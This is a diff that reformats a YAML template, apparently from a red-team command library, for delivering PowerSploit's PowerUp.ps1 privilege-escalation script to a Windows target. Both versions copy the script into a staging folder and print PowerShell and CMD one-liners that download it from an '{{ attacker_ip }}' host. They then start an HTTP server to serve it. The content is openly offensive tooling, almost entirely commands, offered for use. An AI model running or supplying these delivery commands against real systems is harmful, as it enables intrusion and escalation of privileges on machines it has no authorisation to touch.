@@ -1,17 +1,17 @@
+---
 metadata:
-  filename: deliver-windows-PowerUp.ps1.yaml
-  tags:
-  - windows
-  - domain
-  created: '2025-03-29'
-  author: Unknown
-content: "mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1\
-  \ packstation/outbound; \\\necho '================================================================';\
-  \ \\\necho '                      -----PowerShell-----                      '; \\\
-  \necho 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
-  \ }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\\PowerUp.ps1'; \\\necho '================================================================';\
-  \ \\\necho '                         -----CMD-----                          '; \\\
-  \necho 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
-  \ }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\\PowerUp.ps1'; \\\necho '================================================================';\
-  \ \\\n python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{\
-  \ delivery_outbound_port }} -d packstation/outbound\n"
+  filename: "deliver-windows-PowerUp.ps1.yaml"
+  tags: ["windows", "domain"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  mkdir -p packstation/outbound; cp -n /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 packstation/outbound; \
+  echo '================================================================'; \
+  echo '                      -----PowerShell-----                      '; \
+  echo 'Deliver only: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\PowerUp.ps1'; \
+  echo '================================================================'; \
+  echo '                         -----CMD-----                          '; \
+  echo 'Deliver only: powershell wget -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/PowerUp.ps1 -Outfile {{ delivery_path_windows }}\PowerUp.ps1'; \
+  echo '================================================================'; \
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
